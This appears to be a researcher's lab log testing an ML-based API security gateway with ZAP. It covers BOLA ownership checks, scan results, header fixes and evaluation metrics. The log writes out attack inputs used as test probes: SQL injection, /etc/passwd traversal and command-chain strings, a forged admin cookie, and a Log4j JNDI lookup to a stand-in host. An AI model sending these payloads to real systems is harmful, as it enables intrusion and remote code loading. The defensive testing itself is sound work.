The new review process is PID 28796 on port 8081, profile `experimental-payload`. REQ-1001 `GET /api/books/101` was ML BLOCK, class BOLA, model `bola_rf_behavioral`, gateway ALERT, HTTP 200, backend true. The body title was `Foundations of Network Protocol Security`. REQ-1002 `GET /api/books/999001` was the same ML block and gateway ALERT, HTTP 404, body `Book not found.` REQ-1017, user01 reading book 201 with no management parameter, was HTTP 200 with the same public-read mitigation.

Cross-owner checks still reach the demo API. user01 management read REQ-1012 and edit-view REQ-1013 returned `BOLA_AUTHORIZATION_DENIED`. PUT REQ-1014 and DELETE REQ-1015 returned `BOLA_PERMISSION_DENIED`. All four were ML BLOCK, gateway ALERT, HTTP 403, backend true, mitigation `ALERT + backend authorization`. The owner read REQ-1016 was HTTP 200. Book 201, book 301, and the one comment on book 101 were unchanged.

The five HTML 404s now send `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; form-action 'none'; base-uri 'none'`, together with `nosniff` and no `X-Powered-By`. JSON catalog responses do not receive that policy. `Origin: http://localhost:5173` is still echoed, and `Origin: https://evil.example` is not. A fresh ZAP session accessed only those five URLs plus `/api/books` and `/api/books/101`, then waited until the passive queue was empty. The alert list was empty, including plugin 10055. Production `GET /robots.txt` on port 8080 still has no content-security policy and no `nosniff`, which matches the jar that was left running.

The six in-scope cases on this process were SQLI_001 REQ-1018, COOKIE_001 REQ-1019, RCE_001 REQ-1020, TRAVERSAL_001 REQ-1021, LOGFORGE_001 REQ-1022, and LOG4J_001 REQ-1023. Each was malicious probability 1.0, the matching rule, and backend false. XSS_001 REQ-1024 was class RCE with `ATRDF-MARKUP-SCRIPT` and is not counted. `category=Technology`, `search=sleep`, and `ref=a+b;c` were REQ-1025, REQ-1026, and REQ-1027, all ALLOW. The 35-case suite REQ-1028 through REQ-1062 was 35/35 HTTP 200 ALLOW.

`VerifiedIdentityTest`, `PayloadFeaturesTest`, `ReviewInspectionGatewayTest`, and `ReviewRequestGuardTest`: 15 tests, 0 failures, BUILD SUCCESS at 2026-10-11T15:37:37+05:30. Python payload parity passed 22 cases. Reloading `http://localhost:5173/` rendered the seeded catalog. Production PID 32176 and the model files under `models/atrdf` and `models/bola` were unchanged.

## BOLA cases sent through ZAP

Date: 2026-10-11. ZAP 2.17.0 was already listening on `127.0.0.1:8091`. Every case below was submitted with `core/action/sendRequest` to `http://127.0.0.1:8081` only. Port 8080 was not called. Tokens came from `POST /api/auth/login` on the review gateway and were not written down. The login request itself has no prior JWT, so telemetry records user `unknown` until a later request is verified. Experiment `EXP-ZAP-BOLA`. No review rule matched any of these rows (`ruleOutcome` NONE).

Seeded book 101, title `Foundations of Network Protocol Security`, owner user01, was the management and public-read target. It was not edited. User01 created disposable book 111, title `ZAP BOLA disposable record`, for the cross-owner edit and delete. After those denials the direct demo API still returned that title and owner user01. User01 then deleted book 111. A later direct read was HTTP 404. The catalog `GET /api/books` returned HTTP 200 and total 10, including book 101, book 201 `Applied Machine Learning in Anomaly Detection`, and book 301 `Cryptography and Public Key Infrastructure`.

| Case | ZAP message | Request | Identity | Owner | ML | Gateway | Backend | HTTP |
|---|---|---|---|---|---|---|---|---|
| Login user01 | 14 | REQ-1073 `POST /api/auth/login` | unknown on this request | — | ALLOW, BENIGN 1.0, `candidate_binary_rf_payload_six` | ALLOW | reached | 200 |
| Login user02 | 16 | REQ-1074 | unknown on this request | — | ALLOW, BENIGN 1.0, same model | ALLOW | reached | 200 |
| User01 own management read | 17 | REQ-1075 `GET /api/books/101?view=manage` | user01 | user01 | BLOCK, BOLA 1.0 / NORMAL 0.0, `bola_rf_behavioral` | ALERT, `ALERT + backend authorization` | reached, owner allowed | 200, title returned |
| User02 management read of book 101 | 18 | REQ-1076 | user02 | user01 | BLOCK, BOLA 1.0 / NORMAL 0.0 | ALERT, same mitigation | reached, `BOLA_AUTHORIZATION_DENIED` | 403, no book fields |
| User01 create disposable | 19 | REQ-1077 `POST /api/books` | user01 | user01 on the new row | ALLOW, BENIGN 1.0, `candidate_binary_rf_payload_six` | ALLOW | reached | 201, id 111 |
| User02 edit book 111 | 20 | REQ-1078 `PUT /api/books/111` | user02 | user01 | BLOCK, BOLA 0.99 / NORMAL 0.01 | ALERT, `ALERT + backend authorization` | reached, `BOLA_PERMISSION_DENIED`, `requesting_user` user02 | 403 |
| User02 delete book 111 | 21 | REQ-1079 `DELETE /api/books/111` | user02 | user01 | BLOCK, BOLA 0.98 / NORMAL 0.02 | ALERT, same mitigation | reached, `BOLA_PERMISSION_DENIED` | 403, book still present |
| No token, management read of book 101 | 22 | REQ-1080 `GET /api/books/101?view=manage` | unknown | user01 | BLOCK, BOLA 1.0 / NORMAL 0.0 | ALERT, same mitigation | reached, `Authentication required. Please log in.` | 401 |
| Anonymous public read | 23 | REQ-1081 `GET /api/books/101` | unknown | user01 | BLOCK, BOLA 1.0 / NORMAL 0.0 | ALERT, `ALERT + public catalog read` | reached | 200, title returned |
| Owner delete of book 111 | 24 | REQ-1082 `DELETE /api/books/111` | user01 | user01 | BLOCK, BOLA 1.0 / NORMAL 0.0 | ALERT, `ALERT + backend authorization` | reached, deleted | 200, later direct read 404 |

The public-read row is a model alert on a route the demo API serves without an owner check. It is not a BOLA vulnerability. The cross-owner denials are the demo API's JWT and owner checks. The model BLOCK was not the HTTP result; the gateway decision was ALERT and the backend was reached. `VerifiedIdentityTest` passed, 5 tests, 0 failures, BUILD SUCCESS at 2026-10-11T16:06:15+05:30. Opening `http://127.0.0.1:5173/` rendered the ten seeded titles, including book 101, book 201, and book 301. Book 111 was not on the page. Production PID 32176 was still the production jar.

## Six ATRDF families through ZAP

Date: 2026-10-11. The catalog page had a Security Lab panel with Run Test buttons and an Edit (BOLA) button on other users' books. Those controls were removed. `http://127.0.0.1:5173/` now shows the book catalog, search, View Details, and Edit only on the signed-in user's own books. Attack requests for this phase were sent with ZAP 2.17.0 `sendRequest` to `http://127.0.0.1:8081` only. Port 8080 was not called. Experiment `EXP-ZAP-ATRDF`. XSS was not sent. The LOG4J body used `${jndi:ldap://test-research-domain.invalid:1389/Exploit}`. The RCE value was the saved lab string sent as query text to `127.0.0.1`. No operating-system command was run.

On every family below the model blocked at malicious probability 1.0 and the matching review rule also matched. The HTTP result is the model block. The rule did not replace the class. The backend was not reached.

| Family | ZAP message | Request | ML | Rule | HTTP | Backend |
|---|---|---|---|---|---|---|
| SQL Injection | 25 | REQ-1093 `GET /api/books?search=' OR '1'='1 -- UNION SELECT *` | BLOCK, SQL Injection, `BLOCK + parameterized query path` | `ATRDF-SQL-STRUCTURE` | 403 | false |
| Directory Traversal | 26 | REQ-1094 `GET /api/books/..%2F..%2F..%2Fetc%2Fpasswd` | BLOCK, Directory Traversal, `BLOCK + path validation` | `ATRDF-PATH-TRAVERSAL` | 403 | false |
| RCE marker | 27 | REQ-1095 `GET /api/books` with the saved `; cat /etc/passwd` lab query | BLOCK, RCE, `BLOCK (Execution: NOT PERFORMED)` | `ATRDF-COMMAND-CHAIN` | 403 | false |
| Cookie Injection | 32 | REQ-1096 `GET /api/books` with `admin=true; role=superadmin` | BLOCK, Cookie Injection, `BLOCK + session validation` | `ATRDF-COOKIE-AUTHORITY` | 401 | false |
| Log Forging | 33 | REQ-1097 `POST /api/comments/book/101` with the saved `\r\n` and `[CRITICAL]` text | BLOCK, Log Forging, `BLOCK / ALERT + structured logging` | `ATRDF-LOG-LINE` | 403 | false |
| LOG4J | 35 | REQ-1098 `POST /api/comments/book/101` | BLOCK, LOG4J, `BLOCK / ALERT + safe logging` | `ATRDF-JNDI-LOOKUP` | 403 | false |

Model name on these rows was `candidate_binary_rf_payload_six`. Benign controls through the same ZAP call were ALLOW, BENIGN 1.0, malicious 0.0, rule NONE, backend true: `category=Technology` message 36 REQ-1099, `search=sleep` message 37 REQ-1100, and `search=protocol&ref=a+b;c` message 38 REQ-1101. The 35-case suite, experiment `EXP-ZAP-ATRDF-SUITE`, was REQ-1102 through REQ-1136, 35/35 HTTP 200 ALLOW.

Book 101 stayed `Foundations of Network Protocol Security`, owner user01. Book 201 stayed `Applied Machine Learning in Anomaly Detection`, owner user02. Book 101 still had 1 comment. The owner management read REQ-1139 was HTTP 200, ML BLOCK, gateway ALERT, backend true. User02's management read of book 101, REQ-1140, was HTTP 403 `BOLA_AUTHORIZATION_DENIED` with the same alert path. User02's public read REQ-1141 was HTTP 200 with `ALERT + public catalog read`. Reloading `http://127.0.0.1:5173/` showed the seeded catalog and no Security Lab or Edit (BOLA) button. Production PID 32176 was still the production jar.

## Cookie Injection REQ-1096 response source

The HTTP 401 on this row is the review gateway's own status. It is not a demo API authentication response. Live telemetry on PID 28796, retrieved from `GET /api/telemetry/events`, still contains the original event:

| Field | Observed value |
|---|---|
| Timestamp | 2026-10-11T10:42:56.571560700Z |
| Request | `GET /api/books`, experiment `EXP-ZAP-ATRDF`, case `COOKIE_001` |
| User | `unknown` |
| Model | `candidate_binary_rf_payload_six` |
| ML | `mlDecision` BLOCK, class Cookie Injection, confidence 1.0, BENIGN 0.0, MALICIOUS 1.0 |
| Multiclass | Cookie Injection 1.0, every other family 0.0 |
| Gateway decision | BLOCK, mitigation `BLOCK + session validation`, `finalReason` BLOCK |
| Rule | `ATRDF-COOKIE-AUTHORITY`, outcome MATCH |
| `statusCode` | 401 |
| `backendReached` | false |

ZAP message 32 stored the response that was actually returned. The status line is HTTP 401. The body is `{"error":"Invalid session state. Reauthentication required.","code":"Cookie Injection","request_id":"REQ-1096","mitigation":"BLOCK + session validation","gateway_latency_ms":42}`. Response headers include `X-Ml-Decision: BLOCK`, `X-Security-Decision: BLOCK`, `X-Attack-Family: ATRDF`, `X-Rule-Id: ATRDF-COOKIE-AUTHORITY`, `X-Rule-Outcome: MATCH`, and `X-Request-Id: REQ-1096`. That sentence is the gateway block text for the Cookie Injection class. The demo API's missing-token text is `Authentication required. Please log in.`, which was the body on the earlier backend 401, REQ-1080, where `backendReached` was true.

`DecisionEngine` sets status 401 only for the predicted class Cookie Injection. The filter writes that status and JSON, then returns before `forwardToDemoApi`. `backendReached` is set from the forward call, so it stays false on this path. The review package logger is INFO, but the filter does not log each request and no log file is configured. PID 28796 was started in a hidden window, so there is no captured console line for REQ-1096. The telemetry event and the ZAP response are the records.

The demo API console has no line at 10:42:56.571Z. The nearest lines are an invalid-JWT warning at 10:42:18Z and the user01 login at 10:42:58Z. A normal `GET /api/books` is not written to that log even when it arrives, so the gap is consistent with the block and is not separate proof. The proof is `backendReached` false together with the gateway JSON body.

## Frontend passive spider

Date: 2026-10-11. ZAP 2.17.0 on `127.0.0.1:8091` ran spider scan id 0 against `http://127.0.0.1:5173/` in context `frontend5173` (include `http://127.0.0.1:5173.*`, recurse, subtree only, max children 40). During that spider, `8080`, `8081`, `5001`, and `localhost` were excluded, then the exclude list was cleared. No active scan was started. The passive queue reached 0. Active injection stayed on the earlier review-API work and was not pointed at the frontend.

The spider fetched eight messages. Five returned HTTP 200: message 42 `GET /` (`text/html`), message 44 `GET /robots.txt` (`text/html`), message 45 `GET /sitemap.xml` (`text/html`), message 48 `GET /src/main.jsx` (`text/javascript`), and message 50 `GET /@vite/client` (`text/javascript`). Messages 43, 49, and 51 (`/`, `/src`, and `/@vite` without the real resource) have ZAP status 0 and no response. `/robots.txt` and `/sitemap.xml` are the Vite index document, not separate files. The spider did not execute the module graph, so it did not request `App.jsx` or the catalog API.

Passive alerts on `http://127.0.0.1:5173`, 17 instances:

| Plugin | Risk | Finding | URLs |
|---|---|---|---|
| 10021 | Low | `X-Content-Type-Options` header missing | `/`, `/robots.txt`, `/sitemap.xml`, `main.jsx`, `@vite/client` |
| 10020 | Medium | Missing anti-clickjacking header | `/`, `/robots.txt`, `/sitemap.xml` |
| 10038 | Medium | Content Security Policy header not set | `/`, `/robots.txt`, `/sitemap.xml` |
| 90003 | Medium | Subresource integrity attribute missing | `/`, `/robots.txt`, `/sitemap.xml` |
| 10109 | Informational | Modern web application | `/`, `/robots.txt`, `/sitemap.xml` |

These are headers on the Vite development server. The review gateway on 8081 was not the target of this spider. No model or production file was changed. Production PID 32176 was still `gateway-experimental-build` on port 8080.

Opening `http://127.0.0.1:5173/` showed the book catalog. Visible controls were Books Catalog, Request History, Profile, the dashboard link, the user switcher, search, category, Search, Reset, View Details, and Edit on user01's own books. There was no Security Lab button, Run Test button, Edit (BOLA) button, or payload panel. `Navbar.jsx` still contains an unused Security Lab link and is not mounted by `main.jsx`. Search for `Anomaly` left one title, `Applied Machine Learning in Anomaly Detection`, with View Details and no Edit. Opening it showed owner user02 and 0 comments. No comment was submitted. Catalog load REQ-1144 and REQ-1145 were `GET /api/books`, ALLOW, BENIGN, rule NONE, backend true, HTTP 304. The search was REQ-1146, ALLOW, BENIGN, backend true, HTTP 200. The details read was REQ-1147 `GET /api/comments/book/201`, ALLOW, BENIGN, backend true, HTTP 200. The page subtitle still says the gateway is on port 8080, while these browser requests were recorded on the review gateway at 8081.

## Built frontend passive scan

Date: 2026-10-11. The catalog subtitle now says the operations are inspected by the security gateway and does not name a port. The Security Lab link was removed from the unused `Navbar.jsx`. `npm run build` embedded `http://127.0.0.1:8081`. The built files are served by `vite preview` at `http://127.0.0.1:4173/`. The review gateway allowlist now includes that origin. Review PID 22888 is the listener on 8081. Production PID 32176 was not replaced.

Spider scan 1 against `http://127.0.0.1:4173/` ran before the preview headers existed. Direct `GET /` had no `X-Content-Type-Options`, no `X-Frame-Options`, and no Content Security Policy. The passive alerts matched the development-server set: 10021, 10020, 10038, 90003, and 10109, plus 10027 on `assets/index-WAjVMVRh.js`. No active scan ran.

Preview responses now send `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' http://127.0.0.1:8081 https://fonts.googleapis.com https://fonts.gstatic.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'`. Spider scan 2 in context `frontend4173b` fetched `/`, `/robots.txt`, `/sitemap.xml`, `/assets`, the bundled script, and the bundled stylesheet. The robots, sitemap, and `/assets` URLs return that same HTML document. The passive queue finished at 0. Plugins 10021, 10020, and 10038 did not recur.

Remaining alerts on `http://127.0.0.1:4173`:

| Plugin | Risk | Finding | Where |
|---|---|---|---|
| 10055 | Medium | CSP `style-src` includes `'unsafe-inline'` | `/`, `/robots.txt`, `/sitemap.xml`, `/assets` |
| 90003 | Medium | Subresource integrity attribute missing | same HTML responses; evidence is the Google font stylesheet |
| 10109 | Informational | Modern web application | same HTML responses |
| 10027 | Informational | Suspicious comment matching `select` | `/assets/index-WAjVMVRh.js` |

`'unsafe-inline'` is required by the catalog's style attributes. Script sources stay `'self'`. Integrity attributes were not added to the font stylesheet or the hashed local assets. The `select` evidence is the React SVG namespace string, not a query. The development server on port 5173 does not send this policy. Its earlier missing-header alerts remain development-server findings.

`http://127.0.0.1:4173/` showed the seeded catalog, the port-free subtitle, and no attack-launch control. The Technology filter returned four books. Search for `Anomaly` returned one book. View Details showed owner user02 and zero comments. The computed font was Inter. Browser requests REQ-1001 and REQ-1050 through REQ-1054 were ALLOW, BENIGN, backend true.

Experiment `EXP-ZAP-PREVIEW` repeated the gateway checks through ZAP against `http://127.0.0.1:8081` only. The six families were model blocks at malicious probability 1.0, matching rules, backend false: SQLI_001 message 124 REQ-1002, TRAVERSAL_001 message 125 REQ-1003, RCE_001 message 126 REQ-1004, COOKIE_001 message 127 REQ-1005 HTTP 401, LOGFORGE_001 message 128 REQ-1006, LOG4J_001 message 129 REQ-1007. Benign Technology, sleep, and `ref=a+b;c` were REQ-1008 through REQ-1010, ALLOW. The 35-case suite REQ-1011 through REQ-1045 was 35/35 HTTP 200 ALLOW. Owner management read REQ-1048 was BOLA 0.73, gateway ALERT, HTTP 200, backend true. User02's management read REQ-1049 was BOLA 1.0, gateway ALERT, HTTP 403 `BOLA_AUTHORIZATION_DENIED`, backend true. Book 101 kept its title, owner, and one comment. Book 201 kept its title and owner. Production PID 32176 was unchanged.

## Submission reconciliation

The guide-evaluation copies that use these measurements are `submission/report/MTECH_RESEARCH_REPORT.md`, `submission/presentation/MTECH_GUIDE_PRESENTATION.pptx`, `submission/diagrams/01_system_architecture.svg` through `05_zap_workflow.svg`, and `submission/demo/DEMO_CHECKLIST.md`.

Three metric scopes stay separate.

The six-family candidate, from `research/atrdf_payload_experiment/SIX_FAMILY_SCOPE.md`, was scored on the existing seed-42 validation mask: 21,041 rows, 17,271 benign and 3,770 attacks. Accuracy, precision, recall, and F1 are 1.0. The false-positive rate is 0.0. Binary confusion is TN 17,271, FP 0, FN 0, TP 3,770. Family supports are SQL Injection 956, Directory Traversal 464, RCE 488, Cookie Injection 968, Log Forging 459, and LOG4J 435, each with precision, recall, and F1 of 1.0. `REQUEST_ONLY_test.csv` was not opened for this candidate. These figures are validation scores.

The frozen 13-feature forests, from `research/atrdf_header_count_ablation/final_test_evaluation/FINAL_TEST_REPORT.md`, were scored once on 36,554 rows at threshold 0.50. Precision is 1.0, recall is 0.9389856362018558, F1 is 0.9685328438442375, and the false-positive rate is 0.0. Confusion is TN 28,687, FP 0, FN 480, TP 7,387. The 480 misses are 479 LOG4J and 1 Log Forging, so end-to-end LOG4J recall is 0.358768. `docs/RESEARCH_RESULTS.md` Table 5 lists recall 1.0 for every family on the same supports. This file and the submission use the locked matrix. That pass did not score `candidate_binary_rf_payload_six`, and the test file was not opened again.

The live review evidence is experiment `EXP-ZAP-PREVIEW` in the section above: six model blocks at malicious probability 1.0 with matching rules and `backendReached` false, the 35-case suite at 35/35, and BOLA request ids REQ-1048 and REQ-1049. A ZAP alert, an ML prediction, a deterministic-rule match, and a backend authorization result are four different records. The bounded scan and the six scripted requests do not show that every attack is blocked, and they do not show that vulnerabilities are absent.

XSS stays outside the six-family class list. Header-aware validation recall on XSS is 471/931 = 0.5059, with 460 payload-free `GET /forum` rows.

On the built preview at port 4173, plugins 10021, 10020, and 10038 are gone after the preview headers. Plugin 10055 remains because `style-src` includes `'unsafe-inline'` for the catalog style attributes. Plugin 90003 remains because the Google Fonts stylesheet has no integrity attribute and is not a fixed file. Those alerts were left in place. The Vite development server on port 5173 does not send the preview policy, so its missing-header findings stay specific to that server.

Production port 8080 and the files under `models/atrdf` and `models/bola` were not modified for this submission.
